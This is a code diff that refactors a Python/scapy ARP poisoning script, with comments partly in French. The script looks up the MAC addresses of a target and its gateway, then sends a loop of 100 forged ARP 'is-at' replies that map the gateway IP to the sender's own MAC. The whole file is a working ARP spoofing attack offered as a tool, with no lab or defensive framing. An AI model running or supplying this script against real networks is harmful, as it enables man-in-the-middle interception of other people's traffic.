@@ -1,6 +1,5 @@
 #! /usr/bin/python3
 import logging
-import sys
 import time
 
 from args import argument
@@ -10,37 +9,36 @@ from scapy.layers.l2 import ARP
 from scapy.sendrecv import srp
 
 
-class ArpPoising:
-    def __init__(self, ip_target: str):
-        self.target = ip_target
-        self.my_mac = get_if_hwaddr('enp7s0')
+MY_MAC = get_if_hwaddr('enp7s0')  # NOTE recupere mon MAC de l'interface
 
-    def get_mac(self, target: str = None, target_target: bool = False):
-        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target)
 
-        if target_target:
-            pkt['ARP'].pdst = self.target
+def get_mac(gateway: str = None, target: str = None):
+    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gateway)
 
-        resp, _ = srp(pkt, timeout=1, verbose=False, retry=10)
-        for _, r in resp:
-            return r.hwsrc
+    if target:
+        pkt['ARP'].pdst = target
 
-    def poising(self, target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep: int | float = 1.51):
-        """Function target arp table poisoning
+    resp, _ = srp(pkt, timeout=1, verbose=False, retry=10)
+    for _, r in resp:
+        return r.hwsrc
 
-        Args:
-            target_mac (str): target mac for poising arp table
-            gateway_ip (str, optional): ip gateway. Defaults to '192.168.0.1'.
-            loop (int, optional): number send packet . Defaults to 10.
-            sleep (int, optional): time to sleep between each request. Defaults to 1.51.
-        """
-        
-        pkt = Ether(dst=target_mac) / ARP(psrc=gateway_ip,
-                                          hwsrc=self.my_mac, op='is-at', pdst=target_mac)
-        pkt.show()
-        for _ in range(loop):
-            time.sleep(sleep)
-            srp(pkt, timeout=5, verbose=False)
+
+def poising(target_mac: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep: int | float = 1.51):
+    """Function target arp table poisoning
+
+    Args:
+        target_mac (str): target mac for poising arp table
+        gateway_ip (str, optional): ip gateway. Defaults to '192.168.0.1'.
+        loop (int, optional): number send packet . Defaults to 10.
+        sleep (int, optional): time to sleep between each request. Defaults to 1.51.
+    """
+
+    pkt = Ether(dst=target_mac) / ARP(psrc=gateway_ip,
+                                      hwsrc=MY_MAC, op='is-at', pdst=target_mac)
+    pkt.show()
+    for _ in range(loop):
+        time.sleep(sleep)
+        srp(pkt, timeout=5, verbose=False)
 
 
 if __name__ == '__main__':
@@ -51,11 +49,10 @@ if __name__ == '__main__':
     ip_target = arg.target
     ip_gateway = arg.gateway
 
-    poising = ArpPoising(ip_target)
-    mac_addr_gateway = poising.get_mac(ip_gateway)
-    mac_addr_target = poising.get_mac(target_target=True)
+    mac_addr_gateway = get_mac(ip_gateway)
+    mac_addr_target = get_mac(target=ip_target)
 
     print(f'Adresse mac target: {mac_addr_target}')
     print(f'Adresse mac gateway: {mac_addr_gateway}')
 
-    poising.poising(mac_addr_target, loop=100)
+    poising(mac_addr_target, loop=100)
